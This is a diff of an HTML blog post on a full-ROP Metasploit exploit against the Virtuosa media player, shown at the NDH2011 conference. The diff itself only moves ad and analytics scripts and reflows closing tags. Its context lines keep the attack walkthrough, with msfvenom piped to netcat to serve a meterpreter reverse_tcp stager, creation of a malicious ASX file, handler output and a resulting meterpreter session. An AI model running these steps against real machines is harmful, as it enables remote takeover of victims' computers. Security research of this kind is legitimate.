@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2011/06/23/ndh2011-demo-virtuosa-full-rop.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -164,7 +144,8 @@
     <span class="p">}</span>
 
     <span class="k">return</span> <span class="n">str</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>You either bypass it using an encoder or a ROP payload.</p>
 
@@ -424,7 +405,8 @@ msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class=
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> ROP stack size        : 2597
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating <span class="s1">'msf.asx'</span> file ...
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Generated output file /home/kurapix/.msf3/data/exploits/msf.asx
-msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class="o">&gt;</span> </pre></td></tr></tbody></table></code></pre></figure>
+msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class="o">&gt;</span> 
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Here the host and port will point at the machine with the listening netcat</p>
 
@@ -433,7 +415,8 @@ msf exploit<span class="o">(</span>virtuosa<span class="o">)</span> <span class=
 </ul>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="nv">$ </span>./msfvenom <span class="nt">--payload</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.56.1 <span class="nt">--format</span> raw | nc <span class="nt">-v</span> <span class="nt">-l</span> 8080</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nv">$ </span>./msfvenom <span class="nt">--payload</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.56.1 <span class="nt">--format</span> raw | nc <span class="nt">-v</span> <span class="nt">-l</span> 8080
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>En fait je me suis rendu compte que c’est là où ma démo a merdé: j’avais oublié de spécifié le LHOST lors de mon talk.</p>
 
@@ -541,7 +524,8 @@ LHOST <span class="o">=&gt;</span> 192.168.56.1
 msf exploit<span class="o">(</span>handler<span class="o">)</span> <span class="o">&gt;</span> exploit 
 
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse handler on 0.0.0.0:4444 
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the payload handler...</pre></td></tr></tbody></table></code></pre></figure>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the payload handler...
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <ul>
   <li>Then you can launch Virtuosa and import the ASX file (and pawn it).
@@ -549,7 +533,8 @@ You will then get the following in the second terminal (netcat listener):</li>
 </ul>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>Connection from 192.168.56.101 port 8080 <span class="o">[</span>tcp/http-alt] accepted</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>Connection from 192.168.56.101 port 8080 <span class="o">[</span>tcp/http-alt] accepted
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>You will then get the following in the third terminal:</p>
 
@@ -642,7 +627,8 @@ Process list
  828   wuauclt.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM            C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\w</span>uauclt.exe
  1104  Virtuosa.exe      x86   0        EXPERIEN-FB44F4<span class="se">\A</span>dministrator  C:<span class="se">\P</span>rogram Files<span class="se">\V</span>irtuosa<span class="se">\V</span>irtuosa.exe
 
-meterpreter <span class="o">&gt;</span> </pre></td></tr></tbody></table></code></pre></figure>
+meterpreter <span class="o">&gt;</span> 
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>If you want to use those kind of payloads: shell_reverse_tcp, meterpreter, etc. metasploit first send a stager then the corresponding payload. The thing is … exploits/multi/handler only sends the payload and not the stager so you basically get a crash (ever tried to directly execute a DLL from its first byte? =&gt; crash, need a DLL injector or something like that). That is why we need the netcat listener which send the stager for those payloads.</p>
 
@@ -652,7 +638,8 @@ For example for messagebox, you generate the file and then have that in the netc
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="nv">$ </span>./msfvenom <span class="nt">--payload</span> windows/messagebox <span class="nv">ICON</span><span class="o">=</span>WARNING <span class="nv">TEXT</span><span class="o">=</span><span class="s2">"Hacked by m_101 :)"</span> <span class="nt">--format</span> raw | nc <span class="nt">-v</span> <span class="nt">-l</span> 8080
-Connection from 192.168.56.101 port 8080 <span class="o">[</span>tcp/http-alt] accepted</pre></td></tr></tbody></table></code></pre></figure>
+Connection from 192.168.56.101 port 8080 <span class="o">[</span>tcp/http-alt] accepted
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>You basically end up having a nice messagebox like this:</p>
 
@@ -791,6 +778,26 @@ Video is the key ;).</p>
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
